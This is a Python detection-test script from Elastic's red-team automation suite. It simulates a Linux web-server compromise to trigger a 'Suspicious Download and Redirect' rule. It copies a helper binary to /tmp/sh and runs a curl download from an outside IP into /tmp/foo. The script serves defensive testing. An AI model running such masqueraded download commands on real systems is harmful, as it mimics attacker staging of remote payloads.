# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import sys

from . import RtaMetadata, common

metadata = RtaMetadata(
    uuid="a153dec0-914a-4a03-8b6c-a24e55b6f16a",
    platforms=["linux"],
    endpoint=[
        {
            "rule_name": "Suspicious Download and Redirect by Web Server",
            "rule_id": "fa71e336-0177-4732-b58b-53eb4a87a286",
        },
    ],
    techniques=["T1505", "T1059", "T1071"],
)


@common.requires_os(*metadata.platforms)
def main() -> None:
    common.log("Creating a fake executable..")
    masquerade = "/tmp/sh"

    source = common.get_path("bin", "linux.ditto_and_spawn")
    common.copy_file(source, masquerade)
    common.log("Granting execute permissions...")
    common.execute(["chmod", "+x", masquerade])

    commands = [masquerade, "-c", "curl http://8.8.8.8:53/foo > /tmp/foo && xxd"]
    common.execute([*commands], timeout=5, kill=True)
    common.log("Cleaning...")
    common.remove_file(masquerade)
    common.log("Simulation successfull!")


if __name__ == "__main__":
    sys.exit(main())
